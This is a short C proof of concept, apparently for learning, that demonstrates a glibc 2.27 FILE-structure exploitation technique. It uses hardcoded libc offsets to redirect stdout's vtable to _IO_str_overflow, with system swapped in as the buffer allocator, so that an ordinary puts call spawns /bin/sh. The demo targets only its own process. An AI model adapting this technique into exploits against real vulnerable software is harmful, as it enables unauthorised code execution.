#include <stdio.h>
#include <stdlib.h>

// Testing with libc-2.27
// gcc iostroverflow.c -o iostroverflow

// typedef struct {
//     int _flags;
//     char *_IO_read_ptr;
//     char *_IO_read_end;
//     char *_IO_read_base;
//     char *_IO_write_base;
//     char *_IO_write_ptr;
//     char *_IO_write_end;
//     char *_IO_buf_base;
//     char *_IO_buf_end;
//     char *_IO_save_base;
//     char *_IO_backup_base;
//     char *_IO_save_end;
//     void *_markers;
//     void *_chain;
//     int _fileno;
// } _IO_FILE;

int main(void)
{
    char *p;
    void **vtable;
    void *libc;
    void **_IO_str_jumps;
    void **_s;

    char sh[] = "/bin/sh";

    libc = (char *)printf - 0x64f00;
    _IO_str_jumps = (char *)libc + 0x3e8360;

    p = stdout;
    vtable = (void *)&p[0xd8];
    _s = (void *)&p[0xe0];

    // Set vtable[7] = _IO_str_overflow
    *vtable = _IO_str_jumps + 3 - 7;

    // Set fp->_s._allocate_buffer
    *_s = system;

    // Set new_size
    ((_IO_FILE *)p)->_IO_buf_base = 0;
    ((_IO_FILE *)p)->_IO_buf_end  = (unsigned long long)(sh - 100) / 2;

    // Set pos >= _IO_blen(fp) + flush_only
    ((_IO_FILE *)p)->_IO_write_base = 0;
    ((_IO_FILE *)p)->_IO_write_ptr  = ((_IO_FILE *)p)->_IO_buf_end + 1;

    // Call _IO_str_overflow
    puts("Demo");
}
